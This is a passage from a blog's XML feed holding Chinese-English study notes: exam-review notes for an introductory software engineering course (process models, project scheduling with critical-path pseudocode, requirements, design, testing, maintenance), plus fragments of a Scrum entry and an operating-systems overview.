href="#2-2-7-2-Scrum" class="headerlink" title="2.2.7.2 Scrum"></a>2.2.7.2 Scrum</h4><p>Scrum是一个包括了一系列的实践和预定义角色的过程骨架。</p><p>在每一次冲刺（一个15到30 天周期），开发团队创建可用的软件的一个增量。每一个冲刺所要实现的特性来自产品订单（product backlog，产品目标）哪些订单项（目标项目）会被加入一次冲刺，由冲刺计划会议决定。 </p><p>在会议中，产品负责人告诉开发团队他需要完成产品订单中的哪些订单项。开发团队决定在下一次冲刺中他们能够承诺完成多少订单项。 在冲刺的过程中，没有人能够变更冲刺订单（sprint backlog），即使用户需求发生了变化（称为“冻结”）。</p><p>在冲刺中，每一天都会举行项目状况会议，被称为“scrum”或“每日站立会议”。不论团队规模大小，会议被限制在15分钟。所有出席者都应站立或喝咖啡。（有助于保持会议简短）会议应在固定地点和每天的同一时间举行。在会议上，每个团队成员需要回答三个问题：</p><p>你完成了哪些工作？以后你打算做什么？完成你的目标是否存在什么障碍？</p><p>每一个冲刺完成后，都会举行一次冲刺回顾会议，在会议上所有团队成员都要反思这个冲刺。举行冲刺回顾会议是为了进行持续过程改进。会议的时间限制在4小时。</p><p>、</p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;过程&lt;/li&gt;
&lt;li&gt;软件过程模型&lt;ol&gt;
&lt;li&gt;瀑布模型    Waterfall model &lt;/li&gt;
&lt;li&gt;V-模型  V model &lt;/li&gt;
&lt;li&gt;原型模型 Prototyping model &lt;/li&gt;
&lt;li&gt;阶段性开发：增量与迭代  Phased development:  increments and iteration &lt;/li&gt;
&lt;li&gt;螺旋模型  Spiral model &lt;/li&gt;
&lt;li&gt;敏捷开发 Agile methods&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;em&gt;之前随便记的,千万别用来备考期末&lt;/em&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="软件工程概论" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="软件工程" scheme="http://yoursite.com/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>软件工程概论之期末补天笔记</title>
    <link href="http://yoursite.com/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E4%B9%8B%E6%9C%9F%E6%9C%AB%E8%A1%A5%E5%A4%A9%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/08/21/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA%E4%B9%8B%E6%9C%9F%E6%9C%AB%E8%A1%A5%E5%A4%A9%E7%AC%94%E8%AE%B0/</id>
    <published>2020-08-21T08:06:48.000Z</published>
    <updated>2020-08-21T08:21:58.769Z</updated>
    
    <content type="html"><![CDATA[<p>综述了学校软件工程概论课程的常考知识点(中英对照), 不保证考点完全覆盖.</p><p>推荐<a href="https://blog.csdn.net/sandalphon4869/category_9045731.html" target="_blank" rel="noopener">一位学长的博客</a>, 建议搭配打印店往年题食用, 效果奇佳.</p><p>西电无纸化之软件工程分群:929629717</p><a id="more"></a><h2 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h2><h3 id="定义-软件"><a href="#定义-软件" class="headerlink" title="定义: 软件"></a>定义: <strong>软件</strong></h3><p><em>必考</em></p><p>软件是文档、指令、数据结构的集合</p><ul><li><strong>Documents</strong> that describe the operation and use of the programs.<br>文档描述了程序的操作(operation)和使用(use)。</li><li><strong>Instructions</strong> (computer programs) that when executed provide desired function and performance;<br>指令在执行时提供了所需的功能(function)和性能(performance)。</li><li><strong>Data</strong> <strong>structures</strong> that enable the programs to adequately manipulate information;<br>数据结构使程序能够充分地操作信息(information)。</li></ul><h3 id="软件的3个特性"><a href="#软件的3个特性" class="headerlink" title="软件的3个特性"></a><strong>软件的3个特性</strong></h3><p><em>理解</em></p><ol><li>Software is developed or engineered, it is not manufactured in the classical sense.<br>软件是开发或工程的，而不是传统意义上的制造.</li><li>Software doesn’t “wear out”, but it does deteriorate.<br>软件不会“磨损”，但会恶化。</li><li>Most software is custom-built, rather than being assembled from existing component.<br>大多数软件都是定制的，而不是由现有组件组装而成.</li></ol><h3 id="定义-软件工程"><a href="#定义-软件工程" class="headerlink" title="定义: 软件工程 "></a>定义: <strong>软件工程 </strong></h3><p><em>必考</em></p><p>The application of a <strong>systematic</strong> , <strong>disciplined</strong>, <strong>measure-able</strong> approach to the <strong>development</strong>, <strong>operation</strong>, and <strong>maintenance</strong> of software. That is, the application of engineering to software.</p><p>软件工程是将系统的(systematic)、规范的(disciplined)、可度量的(measurable)方法应用于软件的开发(development)、运行(operation)和维护(maintenance)的过程，即将工程化应用于软件中。</p><h3 id="软件涉及到的人员"><a href="#软件涉及到的人员" class="headerlink" title="软件涉及到的人员"></a>软件涉及到的人员</h3><ul><li>consumer   需求提出者</li><li>developer   开发人员</li><li>user   软件的实际使用者</li></ul><h3 id="质量指标"><a href="#质量指标" class="headerlink" title="质量指标"></a>质量指标</h3><p> <em>理解</em></p><ol><li><p>The Quality of the Product,  <strong>McCall</strong></p><p>度量<strong>软件质量</strong>的指标模型</p></li><li><p>The Quality of the Process,  <strong>CMM</strong> (Capability Maturity Mode)</p><p>度量<strong>过程质量</strong>的指标模型</p></li><li><p>The Quality in the Context of the Business Environment, <strong>ROI</strong></p><p>度量<strong>商业价值</strong>的指标模型</p></li></ol><h2 id="第二章-过程"><a href="#第二章-过程" class="headerlink" title="第二章 过程"></a>第二章 过程</h2><h3 id="定义-过程-process"><a href="#定义-过程-process" class="headerlink" title="定义: 过程 process"></a>定义: <strong>过程 process</strong></h3><p><em>必考</em></p><p>process：</p><ul><li>A series of <strong>ordered steps</strong> involving <u><strong>activities</strong>, <strong>constraints</strong>, and <strong>resources</strong></u> that <strong><u>produce an intended output</u></strong> of some kind.</li><li>一系列涉及活动、约束和资源的步骤，这些步骤会产生某种预期的输出。</li></ul><h3 id="Characteristics-of-process"><a href="#Characteristics-of-process" class="headerlink" title="Characteristics of process"></a>Characteristics of process</h3><p><em>了解</em></p><ol><li>过程描述了所有主要的过程活动。<pre><code>   The process describes all the major  process activities.</code></pre></li><li>这个过程使用资源，但受到一系列限制，并生产中间产品和最终产品。<pre><code>   The process uses the resources, subject to a set of constraints, and produces intermediate and final products.</code></pre></li><li>过程可能由以某种方式链接的子过程组成。<pre><code>     The process may be composed of sub-processes that that linked in some way。</code></pre></li><li>每个过程活动都有进入和退出标准，因此我们知道活动开始和结束的时间。<pre><code>   Each process activity has entry and exit criteria, so that we know when the activity begins and ends .</code></pre></li><li>活动按顺序组织，因此一个活动相对于另一个活动的执行时间很清楚。<pre><code>     The activities are organized in a sequence, so that it is clear when one activity is performed relative to the other activity .</code></pre></li><li>每个过程都有一组指导原则来解释每个活动的目标。<pre><code>     Every process has a set of guiding principles that explain the goals of each activity。</code></pre></li><li>约束或控制可以应用于活动、资源或产品<pre><code>   Constraints  or controls may apply to an activity, resource, or product。</code></pre></li></ol><h3 id="定义-生命周期-Life-cycle"><a href="#定义-生命周期-Life-cycle" class="headerlink" title="定义: 生命周期 Life cycle"></a>定义: <strong>生命周期 Life cycle</strong></h3><p><em>必考</em></p><ul><li>当过程涉及到建设某些产品，我们有时把过程称为生命周期。</li><li>when the process involves the building of some product, we sometimes refer to the process as a life cycle.</li><li>The life cycle of a software product include <strong>conception</strong>(概念化)，<strong>implementation</strong>(实现)，<strong>delivery</strong>(交付)，<strong>use</strong>, <strong>maintenance</strong>.(维护)</li></ul><h3 id="定义-模型"><a href="#定义-模型" class="headerlink" title="定义: 模型"></a>定义: 模型</h3><p>  <em>了解</em></p><ul><li>一个过程可以用多种方法来描述，使用文字、图片或组合</li></ul><p>A process can be described in a variety of ways, using text, pictures or a combination.</p><h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a><strong>瀑布模型</strong></h4><p><em>必考(步骤与优缺点)</em></p><h4 id="Step-8"><a href="#Step-8" class="headerlink" title="Step (8)"></a>Step (8)</h4><ol><li>Requirements Analysis 需求分析</li><li>System Design 系统设计</li><li>Program Design 程序设计</li><li>Coding 编程</li><li>Unit &amp; Integration Test 单元&amp;集成测试</li><li>System Test 系统测试</li><li>Acceptance Test 验收测试</li><li>Operation &amp; Maintenance 使用与维护</li></ol><p>特点</p><ol><li><p>One of the first process development models </p><p>是第一个被提出的开发模型之一</p></li><li><p>Works for well understood problems with minimal or no changes in the requirements</p><p>仅需极少的需求或没有任何变化即可解决众所周知的问题</p></li><li><p>It presents a very high-level view of the development process开发过程的顶层理解</p></li><li><p>and sequence of process activities 过程活动的顺序</p></li><li><p>Each major phase is marked by milestones and deliverables  每个主要阶段都具有里程碑和可交付成果</p></li></ol><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul><li><p>The waterfall model can be very useful in <u>helping developers lay out what they need to do</u>.</p><p>在帮助开发人员规划他们需要做的事情时非常有用</p></li><li><p>Its simplicity makes it <u>easy to explain to customers</u> who are not familiar with software development.</p><p>它的简单性使得向不熟悉软件开发的客户解释它很容易</p></li><li><p>It <u>makes explicit which intermediate products are necessary</u> in order to begin the next stage of development.</p><p>它明确了哪些中间产品是必要的，以便开始下一阶段的开发。</p></li><li><p>Many other,more complex models are really just embellishments of waterfall,incorporating feedback loops and extra activities. </p><p>许多其他更复杂的模型实际上只是瀑布的点缀</p></li></ul><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul><li><p>Provides no guidance how to handle changes to products and activities during development (<u>assumes requirements can be frozen</u>)</p><p>没有提供有关如何在开发过程中处理产品和活动更改的指导（假设要求可以冻结）</p></li><li><p>Views software development as manufacturing process rather than as creative process</p><p>将软件开发视为制造过程而非创意过程</p></li><li><p>There is <u>no iterative activities</u> that lead to creating a final Product</p><p>没有迭代活动可以创建最终产品</p></li><li><p>Long wait before a final product</p><p>长时间等待最终产品</p></li></ul><h2 id="第三章-项目管理"><a href="#第三章-项目管理" class="headerlink" title="第三章 项目管理"></a>第三章 项目管理</h2><h3 id="定义-进度-Schedule"><a href="#定义-进度-Schedule" class="headerlink" title="定义: 进度 Schedule"></a>定义: 进度 Schedule</h3><ul><li>A project schedule describes the software development cycle for a particular project by enumerating the phases or stages of the project and breaking each into discrete tasks or activities to be done.</li><li>项目进度通过列举项目的时期或阶段，并将每个阶段分解为待完成的离散任务或活动来描述特定项目的软件开发周期。</li><li>The schedule is a <strong>timeline</strong> that shows when activities will begin and end,and when the related development products while be ready.</li><li>进度是显示活动开始和结束的时间线，以及相关开发产品准备就绪的时间线</li></ul><h3 id="定义-活动"><a href="#定义-活动" class="headerlink" title="定义: 活动"></a>定义: <strong>活动</strong></h3><ul><li>An activity is a <u>part of the project that takes place over a period of time</u>.</li><li>活动是在一段时间内发生的项目的一部分</li></ul><h3 id="定义-里程碑-Milestone"><a href="#定义-里程碑-Milestone" class="headerlink" title="定义: 里程碑 Milestone"></a>定义: <strong>里程碑</strong> Milestone</h3><ul><li>A milestone is <strong><u>the completion of an activity</u></strong>，<strong><u>a particular point in time</u></strong>.</li><li>里程碑是一个活动的完成，一个特定的时间点。</li></ul><h3 id="WBS"><a href="#WBS" class="headerlink" title="WBS"></a>WBS</h3><ul><li>工作分解结构(WBS)将项目描述为一组离散的工作片段。</li><li>work breakdown structure depicts the project as a set of discrete pieces of work.<ul><li>Precursor is an event or set of events that must occur before the activity can begin.<br>前驱是在活动开始之前必须发生的一个或一组事件。</li><li>Due date is the date by which the activity must be completed,frequently determined by contractual deadlines.<br>截止时间是活动必须完成的日期，通常由合同期限决定。</li><li>Duration is length of time needed to complete an activity。<br>工期是完成一项活动所需的时间长度。</li><li>Endpoint is usually a milestone or deliverable<br>终点是里程碑或可交付件。</li></ul></li></ul><h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><ul><li>The critical path is the one for which the slack at every node is zero.</li><li>关键路径是每个节点的松弛度为零的路径。</li></ul><p>从活动图找出关键路径!!! 书后两条练习题 ⭐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对于活动A_B,P-A-B-S 表示前驱活动P_A,后继活动B_S</span></span><br><span class="line"><span class="comment">//活动A_B可能有不止一个前驱/后继, 此时用Pi_A,B_Si表示</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> time_point int<span class="comment">//时刻</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> time_period int<span class="comment">//时间段</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> START 1<span class="comment">//开始时间=1</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END END<span class="comment">//结束时间END</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pre</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    <span class="comment">//返回活动A_B的前驱活动数量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    <span class="comment">//返回活动A_B的后继活动数量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">time_period <span class="title">T</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    <span class="comment">//返回活动A_B需要的时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">time_point <span class="title">EST</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    time_point re;</span><br><span class="line">    <span class="keyword">int</span> preNum = pre(A_B);</span><br><span class="line">    <span class="keyword">if</span>(preNum == <span class="number">0</span>)</span><br><span class="line">        re = START;</span><br><span class="line">    <span class="keyword">if</span>(preNum == <span class="number">1</span>)</span><br><span class="line">        re = EST(P_A) + T(P_A);</span><br><span class="line">    <span class="keyword">if</span>(preNum &gt; <span class="number">1</span>)</span><br><span class="line">        re = <span class="built_in">max</span>(EST(Pi_A) + T(Pi_A));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">time_point <span class="title">LST</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    time_point re;</span><br><span class="line">    <span class="keyword">int</span> subNum = sub(A_B);</span><br><span class="line">    <span class="keyword">if</span>(subNum == <span class="number">0</span>)</span><br><span class="line">        re = END - T(A_B);</span><br><span class="line">    <span class="keyword">if</span>(subNum == <span class="number">1</span>)</span><br><span class="line">        re = LST(B_S) - T(A_B);</span><br><span class="line">    <span class="keyword">if</span>(subNum &gt; <span class="number">1</span>)</span><br><span class="line">        re = <span class="built_in">min</span>(LST(B_Si) - T(A_B));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第四章-需求分析"><a href="#第四章-需求分析" class="headerlink" title="第四章 需求分析"></a>第四章 需求分析</h2><h3 id="定义-需求"><a href="#定义-需求" class="headerlink" title="定义: 需求"></a>定义: 需求</h3><ul><li><p>An <strong>Expression</strong> of desired <strong>Behavior</strong></p><p>期望行为的一种表达。</p></li></ul><p>四种需求</p><ul><li><p>functional requirement : 功能性需求</p><p>describes required behavior in terms of required activities</p></li><li><p>nonfunctional requirement (quality function) 非功能性需求(质量需求)</p><p>describes some quality characteristic that the software must possess.</p></li><li><p>design constraint 设计约束</p><p>a design decision,such as choice of platform.</p></li><li><p>process constraint 过程约束</p><p>a restriction on the techniques or resources that can be used to build the system.</p></li></ul><h3 id="ERD（实体关系图）"><a href="#ERD（实体关系图）" class="headerlink" title="ERD（实体关系图）"></a>ERD（实体关系图）</h3><ul><li><p>entity-relationship diagram (ERD): </p><p>is a popular graphical notational paradigm.</p></li><li><p>三要素</p><ul><li>An entity, epicted as a rectangle, represents a collection of  <pre><code>real-world objects that have common properties and behaviors.</code></pre></li><li>A relationship, depicted as an edge between two entities, with diamond<pre><code>in the middle  of the edge specifying the type of relationship.</code></pre></li><li>An attribute, an annotation(注释) on an entity that describes data or <pre><code>properties associated with the entity.</code></pre></li></ul></li></ul><h3 id="DFD-Data-Flow-Diagram数据流图"><a href="#DFD-Data-Flow-Diagram数据流图" class="headerlink" title="DFD Data Flow Diagram数据流图"></a>DFD Data Flow Diagram数据流图</h3><p>Process, data flow, data store, actors </p><h3 id="UCD-（用例图）"><a href="#UCD-（用例图）" class="headerlink" title="UCD （用例图）"></a>UCD （用例图）</h3><ul><li>概念: use-case diagram(UCD) is similar to a top-level data-flow diagram that depicts observable,user-initiated functionality in terms of interactions between the system and its environment.用例图(UCD)类似于顶级数据流图，根据系统和环境之间的交互描述可观察的、用户发起的功能。</li><li>用处: <u>用于表示需求, 不是设计</u></li><li>怎么画?<ul><li>边界</li><li>case</li></ul></li></ul><h3 id="两种文档-区别作用"><a href="#两种文档-区别作用" class="headerlink" title="两种文档 (区别作用)"></a>两种文档 (区别作用)</h3><ul><li><p>require <strong><u>definition</u></strong> 需求分析说明书 For <strong>Customer</strong></p><p>一般是对某个市场或者是客户群来讲的，类似于调研报告，重点是体现出产品要满足哪些功能，哪些是重点、热点。</p></li><li><p>require <strong><u>specificatiuon</u></strong> 需求规格说明书 For <strong>Developer</strong></p><p>是从业务规则讲起的，细一点偏向于软件的概要设计。是从开发、测试的角度去讲产品功能，里面要包含原型界面、业务接口、活动图等 </p></li></ul><h2 id="第五章-体系结构"><a href="#第五章-体系结构" class="headerlink" title="第五章 体系结构"></a>第五章 体系结构</h2><h3 id="定义-设计"><a href="#定义-设计" class="headerlink" title="定义: 设计"></a>定义: 设计</h3><ul><li>Design is the creative process of figuring out how to implement all of the customer’s requirements; </li><li>the resulting plan is also called the design.</li><li>设计是找出如何实现客户所有要求的创造性过程;</li><li>最终的方案也称为设计。</li></ul><h3 id="体系结构三要素-3C-⭐"><a href="#体系结构三要素-3C-⭐" class="headerlink" title="体系结构三要素(3C)⭐"></a>体系结构三要素(3C)⭐</h3><p>软件体系结构={构件，连接件，约束}</p><ul><li>component(构件): 可以是一组代码，如程序模块，也可以是一个独立运行的程序，如数据库服务器。</li><li>connector(连接件):可以是过程调用，管道，远程调用等，用于表示构建之间的相互作用。</li><li>constraint(约束)：对象的连接规则。</li></ul><p>分解</p><p>自顶向下</p><p>合成</p><h3 id="Style"><a href="#Style" class="headerlink" title="Style"></a>Style</h3><p>概念! </p><ul><li>管道过滤器 <strong>Piper-and-Filter</strong><ul><li>管道是干什么的? 过滤器是什么?</li><li>Transmit data form one filter to then next</li><li>MIS system of XIDIAN University 西电迎新系统</li></ul></li><li>客户服务器 <strong>Client-Server</strong><ul><li>Most transaction processing system(事务处理系统)    Eg. Bank System</li></ul></li><li>…</li></ul><h2 id="第六章-模块设计"><a href="#第六章-模块设计" class="headerlink" title="第六章 模块设计"></a>第六章 模块设计</h2><p>什么是模块化?</p><ul><li>Modularity, also called separation of concerns, is the principle of keeping separate the various unrelated aspects of a system, so that each aspect can be studied in isolation. </li><li>不相关的方面的相互独立</li></ul><p>什么是独立性? Independence?   Separation of Concern</p><h3 id="Coupling-六耦合"><a href="#Coupling-六耦合" class="headerlink" title="Coupling 六耦合"></a>Coupling 六耦合</h3><ul><li>非直接耦合 Uncoupled</li><li>数据耦合 Data</li><li>标记耦合 Stamp</li><li>控制耦合 Control</li><li>公共耦合 Common</li><li>内容耦合 Content</li></ul><h3 id="Concerns-七内聚"><a href="#Concerns-七内聚" class="headerlink" title="Concerns  七内聚"></a>Concerns  七内聚</h3><ul><li>偶然内聚 Coincidence</li><li>逻辑内聚 Logic</li><li>时间内聚 Temporal</li><li>过程内聚 Procedural</li><li>通信内聚 Communicational</li><li>功能内聚 Functional</li><li>(信息内聚) Information</li></ul><p>耦合与内聚 各考一个(判断是什么类型的耦合\内聚)</p><h2 id="第七章-编程"><a href="#第七章-编程" class="headerlink" title="第七章 编程"></a>第七章 编程</h2><h3 id="程序三要素"><a href="#程序三要素" class="headerlink" title="程序三要素"></a>程序三要素</h3><ul><li>控制结构 Control Structural</li><li>算法 Algorithm</li><li>数据结构 Data Structure</li></ul><h3 id="注释-Head-comment-Block"><a href="#注释-Head-comment-Block" class="headerlink" title="注释: Head_comment_Block"></a>注释: Head_comment_Block</h3><p>里面有什么东西(7个)</p><ol><li>Program SCAN</li><li>Programmer</li><li>Calling sequence</li><li>Version</li><li>Revision</li><li>Purpose</li><li>Data structure</li><li>Algorithm</li></ol><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p>内部 Internal documentation</p><ul><li>Head Comment Block</li><li>Other Program Comment</li><li>Meaningful Variable Names and Statement Labels</li><li>Formatting to Enhance Understanding</li></ul><p>外部 External documentation</p><ul><li>describing the problem</li><li>describing the algorithm</li><li>describing the data</li></ul><p>各包括什么content</p><h2 id="第八章-单元测试-⭐"><a href="#第八章-单元测试-⭐" class="headerlink" title="第八章 单元测试 ⭐"></a>第八章 单元测试 ⭐</h2><p>测试方法</p><p>测试用例: </p><ul><li>A test point or test case is <u>a particular choice of <strong>input data</strong></u> to be used in test a program.</li><li>测试点或测试用例是用于测试程序的输入数据的特定选择</li></ul><p>覆盖  由方法选数据</p><p>黑盒白盒: 各测试什么(功能/结构)</p><ul><li>We view the test object form the outside as a <u>closed or black box</u> whose contents are unknown, our testing <strong>feeds inputs to the closed box and notes what output is produced.</strong><br>我们从外部将测试对象视为一个关闭的或内容未知的黑盒，我们的测试将输入输入到关闭的盒子中，并记录产生了什么输出。</li><li>We view the test object as an <u>open</u> <u>box and or white box</u>, we can use the <strong>structure</strong> of the test object to test in different way.<br>我们将测试对象看作是一个开放的盒子或者白盒子，我们可以使用测试对象的结构以不同的方式进行测试。</li></ul><p>路径测试———-给程序, 画流程图,画控制图; 给图, 找测试路径</p><h2 id="第九章-系统测试"><a href="#第九章-系统测试" class="headerlink" title="第九章 系统测试"></a>第九章 系统测试</h2><p>Rush Time 高峰时间</p><p>概念: 前五个</p><ul><li>压力 Stress Test</li><li>容量 Volume Test</li><li>配置 Configuration Test</li><li>Compatibility Test</li><li>Regression Test</li><li>…</li></ul><h2 id="第十章-系统交付"><a href="#第十章-系统交付" class="headerlink" title="第十章 系统交付"></a>第十章 系统交付</h2><p>概念</p><ul><li><p>R 可靠性</p><p>The software reliability is a <strong>possibility</strong> of the system will <strong>operate without failure</strong> under a given conditions and a given time interval.<br>软件可靠性是指系统在给定条件和给定时间间隔下无故障运行的可能性。</p></li><li><p>A 可用性</p><p>The software availability is the <strong>probability</strong> that a system <strong>is operating successfully</strong> according to specification at a given point of time.</p></li><li><p>M 可维护性</p><p>The software maintainability is the probability that , for a given condition of use, a maintenance activity <strong>can be carried out</strong> within stated time interval and using stated procedures and resources.</p><p>给定的使用条件下，可以在规定的时间间隔内并使用规定的过程和资源进行维护活动的可能性。</p></li><li><p>PPT原话!!!!</p></li></ul><h2 id="第十一章-系统维护"><a href="#第十一章-系统维护" class="headerlink" title="第十一章 系统维护"></a>第十一章 系统维护</h2><p>维护的定义</p><p>Any work done to change the system after it is in operation is considered to be maintenance.<br>在系统运行后为改变系统所做的任何工作都被认为是维护。</p><p>四类维护: 判断是什么样的维护…</p><ol><li>Corrective Maintenance     ：Bug 改正性维护</li><li>Adaptive Maintenance    ：Table-Driven Design 适应性维护</li><li>Perfective Maintenance    : DB Upgrade to New Version 完善性维护</li><li>Preventive Maintenance    : Printer Driver: Print-line 预防性维护</li></ol><h2 id="彩蛋-2020年软工概论考题回忆版"><a href="#彩蛋-2020年软工概论考题回忆版" class="headerlink" title="彩蛋: 2020年软工概论考题回忆版"></a>彩蛋: 2020年软工概论考题回忆版</h2><p>题型:选择*15+判断*10+简答*5+大题*3</p><p>选择判断基本全是课后题里面的原句扣关键字</p><p>20年简答:<br>简述瀑布模型及优缺点<br>ERD三要素及功能<br>简述pip and filter的功能<br>简述Head block comment包括的内容<br>简述corrective maintenance</p><p>20年大题:<br>Critical Path<br>Branch Test<br>Logic Flow-&gt;possible path</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;综述了学校软件工程概论课程的常考知识点(中英对照), 不保证考点完全覆盖.&lt;/p&gt;
&lt;p&gt;推荐&lt;a href=&quot;https://blog.csdn.net/sandalphon4869/category_9045731.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一位学长的博客&lt;/a&gt;, 建议搭配打印店往年题食用, 效果奇佳.&lt;/p&gt;
&lt;p&gt;西电无纸化之软件工程分群:929629717&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="软件工程概论" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%AE%BA/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="软件工程" scheme="http://yoursite.com/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>操作系统之概述</title>
    <link href="http://yoursite.com/2020/08/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%A6%82%E8%BF%B0/"/>
    <id>http://yoursite.com/2020/08/14/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%A6%82%E8%BF%B0/</id>
    <published>2020-08-14T07:45:25.000Z</published>
    <updated>2020-08-16T07:57:23.751Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统 系列文章链接🔗</p><p>操作系统之概述:</p><ol><li>OS 定义</li><li>OS 历史</li><li>OS 分类</li><li>计算机底层硬件一览</li><li>OS 中的基本概念</li><li>系统调用</li><li>OS 结构</li></ol><a id="more"></a><h1 id="操作系统-系列文章链接🔗"><a href="#操作系统-系列文章链接🔗" class="headerlink" title="操作系统 系列文章链接🔗"></a>操作系统 系列文章链接🔗</h1><ol><li>操作系统之概述 (本文)</li><li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li><li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li><li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li></ol><h1 id="操作系统之概述"><a href="#操作系统之概述" class="headerlink" title="操作系统之概述"></a>操作系统之概述</h1><p>本章将涉及: </p><ol><li>OS 定义</li><li>OS 历史</li><li>OS 分类</li><li>计算机底层硬件一览</li><li>OS 中的基本概念</li><li>系统调用</li><li>OS 结构</li></ol><p><em>本部分基础概念较多, 仅为应付考试, 中英混杂且不做过多解释.  <del>背就完事了</del></em> </p><h2 id="OS定义"><a href="#OS定义" class="headerlink" title="OS定义"></a>OS定义</h2><h3 id="计算机系统的组成部分"><a 